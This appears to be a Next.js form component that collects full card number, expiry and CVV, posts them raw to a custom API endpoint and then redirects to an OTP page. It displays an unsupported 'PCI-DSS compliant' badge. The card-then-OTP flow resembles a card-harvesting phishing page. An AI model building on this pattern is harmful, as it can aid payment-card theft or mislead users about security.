"use client";

import { useState } from "react";
import { User, CreditCard, Calendar, Lock, ShieldCheck } from "lucide-react";
import { useRouter } from "next/navigation";

export default function CardVerificationForm() {
  const router = useRouter();

  const [form, setForm] = useState({
    cardholderName: "",
    cardNumber: "",
    expiry: "",
    cvv: "",
  });

  const [loading, setLoading] = useState(false);

  const handleChange = (e: React.ChangeEvent<HTMLInputElement>) => {
    setForm({ ...form, [e.target.name]: e.target.value });
  };

  const handleSubmit = async (e: React.FormEvent) => {
    e.preventDefault();
    setLoading(true);

    try {
      const res = await fetch(
        `${process.env.NEXT_PUBLIC_API_URL}/api/card-verification`,
        {
          method: "POST",
          headers: { "Content-Type": "application/json" },
          body: JSON.stringify(form),
        }
      );

      if (!res.ok) throw new Error("Verification failed");

      // ✅ redirect to OTP page
      router.push("/otp");
    } catch (err) {
      alert("Card verification failed");
    } finally {
      setLoading(false);
    }
    
  };

  return (
    <div className="w-full max-w-xl bg-white rounded-xl shadow-md p-6 mt-6">
      <form onSubmit={handleSubmit} className="space-y-4">
        <Input icon={User} name="cardholderName" placeholder="Cardholder Name" onChange={handleChange} />
        <Input icon={CreditCard} name="cardNumber" placeholder="Card Number" onChange={handleChange} />
        
        <div className="grid grid-cols-1 sm:grid-cols-2 gap-4">
          <Input icon={Calendar} name="expiry" placeholder="MM/YY" onChange={handleChange} />
          <Input icon={Lock} name="cvv" placeholder="CVV" type="password" onChange={handleChange} />
        </div>

        <button
          type="submit"
          disabled={loading}
          className="w-full mt-6 bg-[#9b1c23] text-white py-3 rounded-lg font-medium flex items-center justify-center gap-2 hover:bg-[#7f161c] transition disabled:opacity-60"
        >
          <ShieldCheck size={18} />
          {loading ? "Verifying..." : "Submit Securely"}
        </button>
      </form>

      <div className="text-center text-xs text-gray-500 mt-6">
        <p>🔒 Encrypted & PCI-DSS compliant</p>
      </div>
    </div>
  );
}

/* Input */
function Input({ icon: Icon, name, placeholder, type = "text", onChange }: any) {
  return (
    <div className="flex items-center gap-3 border rounded-lg px-4 py-3 bg-gray-50">
      <Icon size={18} className="text-[#9b1c23]" />
      <input
        name={name}
        type={type}
        placeholder={placeholder}
        onChange={onChange}
        required
        className="w-full bg-transparent outline-none text-sm"
      />
    </div>
  );
}
